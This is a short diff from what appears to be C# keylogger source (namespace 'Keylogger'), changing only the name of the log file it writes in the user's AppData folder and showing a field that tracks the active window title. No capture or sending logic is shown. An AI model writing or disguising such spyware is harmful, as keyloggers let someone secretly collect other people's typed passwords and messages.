@@ -10,7 +10,7 @@ namespace Keylogger
     public static class Program
     {
         private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        private static readonly string loggerPath = ApplicationData + @"\qwqdanchunLog.txt";
+        private static readonly string loggerPath = ApplicationData + @"\PLusExecLog.txt";
         private static string CurrentActiveWindowTitle;
 
         public static void Main()
